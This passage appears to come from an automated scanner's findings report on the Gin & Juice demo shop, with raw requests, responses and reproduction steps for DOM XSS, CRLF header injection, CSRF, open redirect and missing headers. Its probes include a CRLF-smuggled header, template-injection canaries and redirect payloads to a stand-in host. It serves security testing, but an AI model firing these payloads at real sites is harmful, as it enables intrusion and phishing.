    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=<sentinelxssmarker>vr2</sentinelxssmarker>; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9475
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:44 GMT
    set-cookie: category={{91*7}}sentinelngmark; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 830.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog with the tested parameter 'category' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (ng_expression_reflection, unescaped_reflection)

## [GINJUICE F05] xss_dom — high (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/blog/ (parameter: `search`)
- Engine verdict: verified via `re-probe:fresh-canary` | confidence 0.9 | rounds 1
- Verification notes (engine-recorded): fresh canary 'domfaf3c884' executed as markup: True
- Impact (engine-assessed): proven — Attacker-controlled data reaches a dangerous DOM sink and EXECUTES in a real browser (execution probe fired) — client-side code execution in victims' sessions.
- Evidence chain (engine-recorded):
    * [dom_execution] source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function trackSearch(query) { document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
- RAW reproduction: no journaled request_ids on this finding's proof (browser-channel or passive class) — see the proof recipe below.
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/blog/ with the tested parameter 'search' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (dom_execution)

## [GINJUICE F06] http_response_header_injection — high (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog (parameter: `category`)
- Engine verdict: verified via `re-test:fresh-header-name` | confidence 0.9 | rounds 1
- Verification notes (engine-recorded): fresh vector split response header x-sentinel-verify-hdr='confirmed; Secure; HttpOnly'
- Impact (engine-assessed): proven — Attacker input reaches a response header (CRLF shape) — header injection into proxies/browsers.
- Evidence chain (engine-recorded):
    * [header_value] CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
    * [header_value] CRLF in param split a second response header: x-sentinel-probe: 'injected; Secure; HttpOnly' (attacker-controlled header injection)
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-48701a8b (exactly as issued by the engine) ---
  GET /catalog?category=sentinelcrlf%0D%0AX-Sentinel-Probe%3A+injected
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=//sentinel-redirect-check.example.org/probe; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9447
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:09 GMT
    set-cookie: category=sentinelcrlf
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
    x-sentinel-probe: injected; Secure; HttpOnly
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 824.4
  --- RAW REQUEST req-82266c20 (exactly as issued by the engine) ---
  GET /catalog?category=sentinelcrlf%0D%0AX-Sentinel-Probe%3A+injected&searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=Accessories; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 9513
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:59 GMT
    set-cookie: category=sentinelcrlf
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
    x-sentinel-probe: injected; Secure; HttpOnly
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 823.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog with the tested parameter 'category' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (header_value)

## [GINJUICE F07] csrf — medium (engine verdict: verified)

- Surface: POST https://ginandjuice.shop/catalog/cart (parameter: `productId, redir, quantity`)
- Engine verdict: verified via `re-test:fresh-hostile-origin` | confidence 0.85 | rounds 3
- Verification notes (engine-recorded): cross-origin replay from https://csrf-vr13-98683a8f.example accepted (baseline 200, replay 200); malformed control rejected (400) — tokenless state-changing request is cross-origin accepted AND input-discriminating
- Impact (engine-assessed): proven — A state-changing request from a hostile origin was accepted exactly like a same-origin one (fresh-origin replay) — silent cross-site action forgery against authenticated users.
- Evidence chain (engine-recorded):
    * [cross_origin_acceptance] state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B) — no CSRF token in the form and no Origin/Referer validation
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-11ac8108 (exactly as issued by the engine) ---
  POST /catalog/cart
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    Origin: https://csrf-probe.example
    Referer: https://csrf-probe.example/x
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    productId=1&redir=PRODUCT&quantity=1
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 11425
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:15 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:13:15 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  redirect_chain: [[302, 'https://ginandjuice.shop/catalog/product?productId=1']]
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Pineapple Edition Cocktail - Product - Gin &amp; Juice Shop</title>
        </head>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 1655.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST https://ginandjuice.shop/catalog/cart with the tested parameter 'productId, redir, quantity' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (cross_origin_acceptance)

## [GINJUICE F08] open_redirect — medium (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/blog/ (parameter: `search`)
- Engine verdict: verified via `re-test:second-host` | confidence 0.85 | rounds 1
- Impact (engine-assessed): proven — Unvalidated redirect to an attacker-controlled destination (fresh target replay) — phishing/trust laundering.
- Evidence chain (engine-recorded):
    * [body_redirect] off-site URL injected into client redirect sink
    * [body_redirect] off-site URL injected into client redirect sink
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-2f09aad5 (exactly as issued by the engine) ---
  GET /blog/?search=https%3A%2F%2Fsentinel-redirect-check.example.org%2Fprobe&back=%2Fblog%2F
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 8729
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:56 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:56 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Gin &amp; Juice Shop</title>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 829.3
  --- RAW REQUEST req-90f1dc85 (exactly as issued by the engine) ---
  GET /blog/?search=%2F%2Fsentinel-redirect-check.example.org%2Fprobe&back=%2Fblog%2F
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 8723
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:09:58 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:09:58 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Gin &amp; Juice Shop</title>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 824.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/blog/ with the tested parameter 'search' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (body_redirect)

## [GINJUICE F09] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-509d39c6 (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 10487
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:35 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:35 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Home - Gin &amp; Juice Shop</title>
        </head>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 821.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F10] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/labheader/css/scanMeHeader.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f875bdf7 (exactly as issued by the engine) ---
  GET /resources/labheader/css/scanMeHeader.css
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 17628
    content-type: text/css
    date: Sat, 03 Oct 2026 01:06:37 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:37 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    #scanMeHeader {
      all: initial;
      --spacingbase: 0.9em;
      --heading-line-height: 24px;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 16px;
      text-align: right;
    }
    #scanMeHeader .header-description {
      background: #F2F3F6;
      width: 100vw;
      max-width: 100%;
    ... [137 more lines, 4000 chars total]
  elapsed_ms: 1025.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/labheader/css/scanMeHeader.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F11] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/css/labsScanme.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-34bd64cb (exactly as issued by the engine) ---
  GET /resources/css/labsScanme.css
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 84673
    content-type: text/css
    date: Sat, 03 Oct 2026 01:06:38 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:38 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    :root {
      --spacingbase: 0.9em;
    }
    
    @media (min-width: 992px) {
      :root {
        --spacingbase: 1em;
      }
    }
    @media (min-width: 1200px) {
      :root {
        --spacingbase: 1.1em;
    ... [185 more lines, 4000 chars total]
  elapsed_ms: 1225.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/css/labsScanme.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F12] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/react.development.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-c320c727 (exactly as issued by the engine) ---
  GET /resources/js/react.development.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 109909
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:39 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:39 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    /**
     * @license React
     * react.development.js
     *
     * Copyright (c) Facebook, Inc. and its affiliates.
     *
     * This source code is licensed under the MIT license found in the
     * LICENSE file in the root directory of this source tree.
     */
    (function (global, factory) {
      typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports) :
      typeof define === 'function' && define.amd ? define(['exports'], factory) :
    ... [121 more lines, 4000 chars total]
  elapsed_ms: 1442.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/react.development.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F13] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/react-dom.development.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-db47ecad (exactly as issued by the engine) ---
  GET /resources/js/react-dom.development.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 1077021
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:41 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:41 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    /**
     * @license React
     * react-dom.development.js
     *
     * Copyright (c) Facebook, Inc. and its affiliates.
     *
     * This source code is licensed under the MIT license found in the
     * LICENSE file in the root directory of this source tree.
     */
    (function (global, factory) {
      typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('react')) :
      typeof define === 'function' && define.amd ? define(['exports', 'react'], factory) :
    ... [105 more lines, 4000 chars total]
  elapsed_ms: 2059.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/react-dom.development.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F14] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/angular_1-7-7.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f872e7c2 (exactly as issued by the engine) ---
  GET /resources/js/angular_1-7-7.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 195161
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:43 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:43 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    /*
     AngularJS v1.7.7
     (c) 2010-2018 Google, Inc. http://angularjs.org
     License: MIT
    */
    (function(C){'use strict';function re(a){if(D(a))w(a.objectMaxDepth)&&(Wb.objectMaxDepth=Xb(a.objectMaxDepth)?a.objectMaxDepth:NaN),w(a.urlErrorParamsEnabled)&&Ga(a.urlErrorParamsEnabled)&&(Wb.urlErrorParamsEnabled=a.urlErrorParamsEnabled);else return Wb}function Xb(a){return W(a)&&0<a}function F(a,b){b=b||Error;return function(){var d=arguments[0],c;c="["+(a?a+":":"")+d+"] http://errors.angularjs.org/1.7.7/"+(a?a+"/":"")+d;for(d=1;d<arguments.length;d++){c=c+(1==d?"?":"&")+"p"+(d-1)+"=";var e=encodeURIComponent,
        f;f=arguments[d];f="function"==typeof f?f.toString().replace(/ \{[\s\S]*$/,""):"undefined"==typeof f?"undefined":"string"!=typeof f?JSON.stringify(f):f;c+=e(f)}return new b(c)}}function ya(a){if(null==a||$a(a))return!1;if(H(a)||A(a)||x&&a instanceof x)return!0;var b="length"in Object(a)&&a.length;return W(b)&&(0<=b&&b-1 in a||"function"===typeof a.item)}function r(a,b,d){var c,e;if(a)if(B(a))for(c in a)"prototype"!==c&&"length"!==c&&"name"!==c&&a.hasOwnProperty(c)&&b.call(d,a[c],c,a);else if(H(a)||
        ya(a)){var f="object"!==typeof a;c=0;for(e=a.length;c<e;c++)(f||c in a)&&b.call(d,a[c],c,a)}else if(a.forEach&&a.forEach!==r)a.forEach(b,d,a);else if(Nc(a))for(c in a)b.call(d,a[c],c,a);else if("function"===typeof a.hasOwnProperty)for(c in a)a.hasOwnProperty(c)&&b.call(d,a[c],c,a);else for(c in a)ta.call(a,c)&&b.call(d,a[c],c,a);return a}function Oc(a,b,d){for(var c=Object.keys(a).sort(),e=0;e<c.length;e++)b.call(d,a[c[e]],c[e]);return c}function Yb(a){return function(b,d){a(d,b)}}function se(){return++pb}
        function Zb(a,b,d){for(var c=a.$$hashKey,e=0,f=b.length;e<f;++e){var g=b[e];if(D(g)||B(g))for(var k=Object.keys(g),h=0,l=k.length;h<l;h++){var m=k[h],p=g[m];d&&D(p)?ha(p)?a[m]=new Date(p.valueOf()):ab(p)?a[m]=new RegExp(p):p.nodeName?a[m]=p.cloneNode(!0):$b(p)?a[m]=p.clone():(D(a[m])||(a[m]=H(p)?[]:{}),Zb(a[m],[p],!0)):a[m]=p}}c?a.$$hashKey=c:delete a.$$hashKey;return a}function S(a){return Zb(a,Ha.call(arguments,1),!1)}function te(a){return Zb(a,Ha.call(arguments,1),!0)}function fa(a){return parseInt(a,
            10)}function ac(a,b){return S(Object.create(a),b)}function E(){}function Ta(a){return a}function ia(a){return function(){return a}}function bc(a){return B(a.toString)&&a.toString!==la}function z(a){return"undefined"===typeof a}function w(a){return"undefined"!==typeof a}function D(a){return null!==a&&"object"===typeof a}function Nc(a){return null!==a&&"object"===typeof a&&!Pc(a)}function A(a){return"string"===typeof a}function W(a){return"number"===typeof a}function ha(a){return"[object Date]"===la.call(a)}
        function H(a){return Array.isArray(a)||a instanceof Array}function cc(a){switch(la.call(a)){case "[object Error]":return!0;case "[object Exception]":return!0;case "[object DOMException]":return!0;default:return a instanceof Error}}function B(a){return"function"===typeof a}function ab(a){return"[object RegExp]"===la.call(a)}function $a(a){return a&&a.window===a}function bb(a){return a&&a.$evalAsync&&a.$watch}function Ga(a){return"boolean"===typeof a}function ue(a){return a&&W(a.length)&&ve.test(la.call(a))}
        function $b(a){return!(!a||!(a.nodeName||a.prop&&a.attr&&a.find))}function we(a){var b={};a=a.split(",");var d;for(d=0;d<a.length;d++)b[a[d]]=!0;return b}function ua(a){return K(a.nodeName||a[0]&&a[0].nodeName)}function cb(a,b){var d=a.indexOf(b);0<=d&&a.splice(d,1);return d}function Ia(a,b,d){function c(a,b,c){c--;if(0>c)return"...";var d=b.$$hashKey,f;if(H(a)){f=0;for(var g=a.length;f<g;f++)b.push(e(a[f],c))}else if(Nc(a))for(f in a)b[f]=e(a[f],c);else if(a&&"function"===typeof a.hasOwnProperty)for(f in a)a.hasOwnProperty(f)&&
    ... [1 more lines, 4000 chars total]
  elapsed_ms: 1635.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/angular_1-7-7.js as recorded
